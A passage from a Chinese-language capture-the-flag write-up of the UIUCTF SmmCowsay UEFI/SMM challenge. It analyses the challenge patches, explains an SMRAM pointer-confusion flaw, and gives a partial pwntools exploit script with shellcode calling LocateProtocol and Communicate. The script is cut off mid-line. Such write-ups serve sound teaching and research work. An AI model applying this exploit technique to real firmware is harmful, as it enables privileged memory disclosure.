CONST EFI_GUID                *HandlerType  OPTIONAL,</span><br><span class="line">  OUT EFI_HANDLE                    *DispatchHandle</span><br><span class="line">  )</span><br></pre></td></tr></table></figure><p>这里重点注意第一个参数，这个函数将 handle 加入处理程序列表中，当发生 SMI 时，EDK2 注册的 SMI 处理程序会浏览已注册处理程序的链接列表，并选择合适的处理程序来运行。  </p><p>其处理程序 SmmCowsayHandler 如下：  </p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+EFI_STATUS</span></span><br><span class="line"><span class="addition">+EFIAPI</span></span><br><span class="line"><span class="addition">+SmmCowsayHandler (</span></span><br><span class="line"><span class="addition">+  IN EFI_HANDLE  DispatchHandle,</span></span><br><span class="line"><span class="addition">+  IN CONST VOID  *Context         OPTIONAL,</span></span><br><span class="line"><span class="addition">+  IN OUT VOID    *CommBuffer      OPTIONAL,</span></span><br><span class="line"><span class="addition">+  IN OUT UINTN   *CommBufferSize  OPTIONAL</span></span><br><span class="line"><span class="addition">+  )</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+  DEBUG ((DEBUG_INFO, &quot;SmmCowsay SmmCowsayHandler Enter\n&quot;));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (!CommBuffer || !CommBufferSize || *CommBufferSize &lt; sizeof(CHAR16 *))</span></span><br><span class="line"><span class="addition">+    return EFI_SUCCESS;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Cowsay(*(CONST CHAR16 **)CommBuffer);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  DEBUG ((DEBUG_INFO, &quot;SmmCowsay SmmCowsayHandler Exit\n&quot;));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  return EFI_SUCCESS;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br></pre></td></tr></table></figure><p>这个函数首先对 CommBuffer 和 CommBufferSize 进行了检测，如果没有问题就执行 Cowsay。这样看见这里存在一个二级指针，很有可能会出现我们上面提过的 Arbitrary SMRAM Corruption 漏洞，我们先记住这个地方。</p><p>接下来看 0004-Add-UEFI-Binexec.patch 文件，我们运行 run.sh 的时候会出现 binexec，我们不难猜到这个文件就是用于和进行用户交互。<br>我们重点关注交互部分的代码：  </p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+VOID</span></span><br><span class="line"><span class="addition">+Cowsay (</span></span><br><span class="line"><span class="addition">+  IN CONST CHAR16 *Message</span></span><br><span class="line"><span class="addition">+  )</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+  EFI_SMM_COMMUNICATE_HEADER *Buffer;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Buffer = AllocateRuntimeZeroPool(sizeof(*Buffer) + sizeof(CHAR16 *));</span></span><br><span class="line"><span class="addition">+  if (!Buffer)</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Buffer-&gt;HeaderGuid = gEfiSmmCowsayCommunicationGuid;</span></span><br><span class="line"><span class="addition">+  Buffer-&gt;MessageLength = sizeof(CHAR16 *);</span></span><br><span class="line"><span class="addition">+  *(CONST CHAR16 **)&amp;Buffer-&gt;Data = Message;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  mSmmCommunication-&gt;Communicate(</span></span><br><span class="line"><span class="addition">+    mSmmCommunication,</span></span><br><span class="line"><span class="addition">+    Buffer,</span></span><br><span class="line"><span class="addition">+    NULL</span></span><br><span class="line"><span class="addition">+  );</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  FreePool(Buffer);</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br></pre></td></tr></table></figure><p>这里的操作大概就是申请一个 Buffer，然后设置他的参数，最后调用 mSmmCommunication-&gt;Communicate。<br>这里 mSmmCommunication 对象是一个 EFI_SMM_COMMUNICATION_PROTOCOL 类型的结构体，其定义如下：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">EFI_SMM_COMMUNICATION_PROTOCOL  mSmmCommunication = &#123;</span><br><span class="line">  SmmCommunicationCommunicate</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">SmmCommunicationCommunicate</span> (</span><br><span class="line">  IN CONST EFI_SMM_COMMUNICATION_PROTOCOL  *This,</span><br><span class="line">  IN OUT VOID                              *CommBuffer,</span><br><span class="line">  IN OUT UINTN                             *CommSize OPTIONAL</span><br><span class="line">  );</span><br></pre></td></tr></table></figure><p>SmmCommunicationCommunicate 用于在 SMM 模式下进行通信。因为我们实际运行的二进制文件是在 UEFI 引导环境下执行的独立应用程序，但不是在 SMM 环境下执行，我们没法直接和 SMM 内运行的 SmmCowsay 驱动交互，只能通过 SmmCommunicationCommunicate 函数。因此我们只需要注意这个函数的参数就可以知道通信的内容了。此函数将消息复制到全局变量中，并触发软件 SMI 来处理该消息。该消息包含我们要与之通信的 SMM 处理程序的 GUID，在进入 SMM 时会在已注册处理程序的链接列表中搜索该 GUID。<br>SmmCommunicationCommunicate 函数的第二个参数对应是的代码中的 Buffer 对象，是 EFI_SMM_COMMUNICATE_HEADER 结构体类型。  </p><p>接下来我们来看 qemu 的 patch，存在一个全局的类似于 flag 的 char 字符数组：  </p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+static char nice_try_msg[] = &quot;uiuctf&#123;nice try!!!!!!!!!!!!&#125;\n&quot;;</span></span><br></pre></td></tr></table></figure><p>找到调用了这个字符串的地方：  </p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+static MemTxResult uiuctfmmio_region4_read_with_attrs(</span></span><br><span class="line"><span class="addition">+    void *opaque, hwaddr addr, uint64_t *val, unsigned size, MemTxAttrs attrs)</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+    if (!attrs.secure)</span></span><br><span class="line"><span class="addition">+        uiuctfmmio_do_read(addr, val, size, nice_try_msg, nice_try_len);</span></span><br><span class="line"><span class="addition">+    else</span></span><br><span class="line"><span class="addition">+        uiuctfmmio_do_read(addr, val, size, region4_msg, region4_len);</span></span><br><span class="line"><span class="addition">+    return MEMTX_OK;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+static const MemoryRegionOps uiuctfmmio_region4_io_ops =</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+    .write = uiuctfmmio_write,</span></span><br><span class="line"><span class="addition">+    .read_with_attrs = uiuctfmmio_region4_read_with_attrs,</span></span><br><span class="line"><span class="addition">+    .valid.min_access_size = 1,</span></span><br><span class="line"><span class="addition">+    .valid.max_access_size = 8,</span></span><br><span class="line"><span class="addition">+    .endianness = DEVICE_NATIVE_ENDIAN,</span></span><br><span class="line"><span class="addition">+&#125;;</span></span><br></pre></td></tr></table></figure><p>可以看到调用 uiuctfmmio_region4_read_with_attrs 函数时如果 attrs.secure 的值为 true 时，就会走入 region4_msg，否则走入 nice_try_msg。我们可以认为需要在安全的环境下调用该函数也就是在 SMBASE 的环境中调用才会进入到 region4_msg。  </p><p>接下来看看 flag 相关函数：</p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+static void uiuctfmmio_realize(DeviceState *d, Error **errp)</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+    SysBusDevice *dev = SYS_BUS_DEVICE(d); </span></span><br><span class="line"><span class="addition">+    UiuctfmmioState *sio = UIUCTFMMIO(d);</span></span><br><span class="line"><span class="addition">+    Object *obj = OBJECT(sio);</span></span><br><span class="line"><span class="addition">+    MemoryRegion *sysbus = sysbus_address_space(dev);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    memory_region_init_io(&amp;sio-&gt;region4, obj, &amp;uiuctfmmio_region4_io_ops, sio,</span></span><br><span class="line"><span class="addition">+                          TYPE_UIUCTFMMIO, 0x1000);</span></span><br><span class="line"><span class="addition">+    sysbus_init_mmio(dev, &amp;sio-&gt;region4);</span></span><br><span class="line"><span class="addition">+    memory_region_add_subregion(sysbus, 0x44440000, &amp;sio-&gt;region4);</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br></pre></td></tr></table></figure><p>给代码加点注释：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">uiuctfmmio_realize</span><span class="params">(DeviceState *d, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    SysBusDevice *dev = SYS_BUS_DEVICE(d); <span class="comment">// 将DeviceState指针转换为SysBusDevice指针，以便可以访问系统总线的相关函数。</span></span><br><span class="line">    UiuctfmmioState *sio = UIUCTFMMIO(d);   <span class="comment">// 通过UIUCTFMMIO宏获取设备特定的状态结构指针。</span></span><br><span class="line">    Object *obj = OBJECT(sio);             <span class="comment">// 将设备状态结构指针转换为Object指针，Object是QEMU中表示对象的通用结构。</span></span><br><span class="line">    MemoryRegion *sysbus = sysbus_address_space(dev); <span class="comment">// 获取系统总线的地址空间，这是一个MemoryRegion指针，用于管理内存区域。</span></span><br><span class="line"></span><br><span class="line">    memory_region_init_io(&amp;sio-&gt;region4, obj, &amp;uiuctfmmio_region4_io_ops, sio, <span class="comment">// 初始化一个新的MemoryRegion，用于I/O操作。</span></span><br><span class="line">                          TYPE_UIUCTFMMIO, <span class="number">0x1000</span>); <span class="comment">// 指定内存区域的大小为0x1000字节，并关联uiuctfmmio_region4_io_ops操作函数和设备状态结构。</span></span><br><span class="line">    sysbus_init_mmio(dev, &amp;sio-&gt;region4); <span class="comment">// 将初始化的内存区域注册到系统总线上，使其可以处理内存映射I/O。</span></span><br><span class="line">    memory_region_add_subregion(sysbus, <span class="number">0x44440000</span>, &amp;sio-&gt;region4); <span class="comment">// 将内存区域添加到系统总线的地址空间中，从地址0x44440000开始，这样当模拟的CPU访问这个地址时，会触发相应的I/O操作函数。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码定义了一个虚拟设备的初始化函数，它创建了一个内存映射 I&#x2F;O 区域，并将其映射到系统总线的特定地址范围，以便在模拟环境中可以模拟对这个硬件设备的访问，也可以理解为我们的 flag 就在 0x44440000 这个物理地址上。  </p><p>回顾一下开头，开头的 System Table地址是题目直接给我们的。EFI System Table 里面有几乎所有我们需要的UEFI驱动的信息。可以通过这个 Table 寻址到很多 api 方法和配置变量。  </p><p>接下来分析一下漏洞点：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID</span></span><br><span class="line"><span class="function"><span class="title">Cowsay</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  IN CONST CHAR16 *Message</span></span></span><br><span class="line"><span class="params"><span class="function">  )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  EFI_SMM_COMMUNICATE_HEADER *Buffer;</span><br><span class="line"></span><br><span class="line">  Buffer = <span class="built_in">AllocateRuntimeZeroPool</span>(<span class="built_in">sizeof</span>(*Buffer)  <span class="built_in">sizeof</span>(CHAR16 *));</span><br><span class="line">  <span class="keyword">if</span> (!Buffer)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  Buffer-&gt;HeaderGuid = gEfiSmmCowsayCommunicationGuid;</span><br><span class="line">  Buffer-&gt;MessageLength = <span class="built_in">sizeof</span>(CHAR16 *);</span><br><span class="line">  *(CONST CHAR16 **)&amp;Buffer-&gt;Data = Message;</span><br><span class="line"></span><br><span class="line">  mSmmCommunication-&gt;<span class="built_in">Communicate</span>(</span><br><span class="line">    mSmmCommunication,</span><br><span class="line">    Buffer,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">FreePool</span>(Buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前面分析过，此处的 communicate 是 UEFI 应用程序 (binexec) 和驱动之间通信的桥梁。传入的 Buffer 的结构是 EFI_SMM_COMMUNICATE_HEADER，具体如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// Allows for disambiguation of the message format.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EFI_GUID  HeaderGuid;</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// Describes the size of Data (in bytes) and does not include the size of the header.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  UINTN     MessageLength;</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// Designates an array of bytes that is MessageLength in size.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  UINT8     Data[<span class="number">1</span>];</span><br><span class="line">&#125; EFI_SMM_COMMUNICATE_HEADER;</span><br></pre></td></tr></table></figure><p>注意到这一段代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(CONST CHAR16 **)&amp;Buffer-&gt;Data = Message;</span><br></pre></td></tr></table></figure><p>我们传给data成员的是一个指针 Message。  </p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+EFI_STATUS</span></span><br><span class="line"><span class="addition">+EFIAPI</span></span><br><span class="line"><span class="addition">+SmmCowsayHandler (</span></span><br><span class="line"><span class="addition">+  IN EFI_HANDLE  DispatchHandle,</span></span><br><span class="line"><span class="addition">+  IN CONST VOID  *Context         OPTIONAL,</span></span><br><span class="line"><span class="addition">+  IN OUT VOID    *CommBuffer      OPTIONAL,</span></span><br><span class="line"><span class="addition">+  IN OUT UINTN   *CommBufferSize  OPTIONAL</span></span><br><span class="line"><span class="addition">+  )</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+  DEBUG ((DEBUG_INFO, &quot;SmmCowsay SmmCowsayHandler Enter\n&quot;));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (!CommBuffer || !CommBufferSize || *CommBufferSize &lt; sizeof(CHAR16 *))</span></span><br><span class="line"><span class="addition">+    return EFI_SUCCESS;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Cowsay(*(CONST CHAR16 **)CommBuffer);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  DEBUG ((DEBUG_INFO, &quot;SmmCowsay SmmCowsayHandler Exit\n&quot;));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  return EFI_SUCCESS;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br></pre></td></tr></table></figure><p>之前已经注册了的 smi 的处理函数，CommBuffer 即对应着我们传入的 Message 的 data。可以看到这里 CommBuffer 并没有做任何检测就给 Cowsay 函数给调用，而 Cowsay 函数就类似于一个后门打印出 *CommBuffer 所指向的内存空间的内容，所以我们不难想到如果我们能够控制 传入的 CommBuffer 并控制 *CommBuffer 为 flag 的地址，程序就能直接打印出 flag。那现在的问题是我们要控制 CommBuffer 呢，更重要的是我们要如何调用 SmmCowsayHandler。通过前面的分析我们知道调用 SmmCowsayHandler 等于我们要调用：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mSmmCommunication-&gt;<span class="built_in">Communicate</span>(</span><br><span class="line">  mSmmCommunication,</span><br><span class="line">  Buffer,</span><br><span class="line">  <span class="literal">NULL</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>首先找到 mSmmCommunication</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Status = gBS-&gt;<span class="built_in">LocateProtocol</span>(</span><br><span class="line">    &amp;gEfiSmmCommunicationProtocolGuid,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    (VOID **)&amp;mSmmCommunication</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>然后找 gpt 帮忙解释了一下:)  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">这段代码是用来查找并获取一个协议的接口指针。具体来说，这段代码的功能如下：</span><br><span class="line"></span><br><span class="line">gBS 是指向Boot Services的指针，它提供了UEFI启动服务中的一系列函数。</span><br><span class="line">LocateProtocol 是Boot Services中的一个函数，用于在系统中查找指定的协议。</span><br><span class="line">下面是对LocateProtocol函数参数的详细解释：</span><br><span class="line"></span><br><span class="line">&amp;gEfiSmmCommunicationProtocolGuid：这是一个指向协议GUID（全局唯一标识符）的指针。gEfiSmmCommunicationProtocolGuid是这个协议的唯一标识符，它用于指定要查找的协议类型。在这里，它指的是EFI SMM通信协议，这个协议用于在系统管理模式（SMM）和正常执行模式之间传递消息。</span><br><span class="line">NULL：这个参数是协议接口的父句柄。在许多情况下，如果不需要特定的父句柄，可以传递NULL。</span><br><span class="line">(VOID **)&amp;mSmmCommunication：这是一个输出参数，指向一个指针的地址，该指针在函数成功执行后将被设置为指向找到的协议接口。在这个例子中，如果LocateProtocol成功找到EFI SMM通信协议，mSmmCommunication将包含指向该协议实例的指针。</span><br><span class="line"></span><br><span class="line">综上所述，这段代码的作用是：在UEFI环境中查找EFI SMM通信协议的实例，并将该协议的接口指针存储在mSmmCommunication变量中，以便后续代码可以使用这个协议进行系统管理模式的通信。如果协议被成功找到，函数返回状态码EFI_SUCCESS；如果找不到，则返回一个错误码。</span><br></pre></td></tr></table></figure><p>调用成功后第三个参数会变成一个协议的接口，随后我们就可以通过这个接口去调用 Communicate。所以我们目标又变成了调用 LocateProtocol。而 LocateProtocol 是 UEFI 的系统服务，是 BootServices 结构体的一个成员函数。所以调用链也很清晰了 EFI_SYSTEM_TABLE-&gt;BootServices-&gt;LocateProtocol。理论可行，干了 xdm  </p><p>这里有个问题是如何找 gEfiSmmCommunicationProtocolGuid，我们可以直接将 Binexec.efi 直接拖进 ida 里面看他是怎么调用 LocateProtocol 的，然后直接找到 gEfiSmmCommunicationProtocolGuid。  </p><img src="/2024/12/14/uefi/16.png" class="" title="我的图图呢">  <p>找这玩意其实也有点技巧，我们不难看出 qword_103128 对应的是 bootService，因为这里是 +320，一看就是 LocateProtocol 的偏移。<br>获取到 mSmmCommunication后，就能顺藤摸瓜的获取到 Communicate 函数。  </p><p>这里需要特别注意函数的传参方式，不是我们平时的 rdi、rsi、rdx、rcx、r8、r9……  </p><img src="/2024/12/14/uefi/18.png" class="" title="我的图图呢">  <p>而是 rcx、rdx、r8、r9，剩余参数布置在栈中  </p><p>有 Communicate 了我们只需要构造一个 buffer 按道理来说就可以输出 0x44440000 地址的 flag 了。buffer 中的 headerGuid 我们可以和上面一样的方法把 SmmCowsay.efi 丢进 ida 里面查找。  </p><img src="/2024/12/14/uefi/17.png" class="" title="我的图图呢">  <p>最后写出来的 exp 如下：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./run.sh&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Address of SystemTable: 0x&#x27;</span>)</span><br><span class="line">systemTable = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">codeAddr = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;systemTable&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;codeAddr&quot;</span>)</span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;systemTable&#125;</span></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax + 96]</span></span><br><span class="line"><span class="string">    mov rbx, qword ptr [rax + 320]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">BootServices = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RBX: 0x&#x27;</span>)</span><br><span class="line">LocateProtocol = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;BootServices&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;LocateProtocol&quot;</span>)</span><br><span class="line"></span><br><span class="line">gEfiSmmCommunicationProtocolGuid = <span class="number">0x32c3c5ac65db949d4cbd9dc6c68ed8e2</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* LocateProtocol(gEfiSmmCommunicationProtocolGuid, NULL, &amp;protocol) */</span></span><br><span class="line"><span class="string">    lea rcx, qword ptr [rip + guid]</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    lea r8, qword ptr [rip + protocol]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;LocateProtocol&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + protocol] /* mSmmCommunication */</span></span><br><span class="line"><span class="string">    mov rbx, qword ptr [rax]            /* mSmmCommunication-&gt;Communicate */</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">guid:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCommunicationProtocolGuid&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">protocol:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;code:&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX: 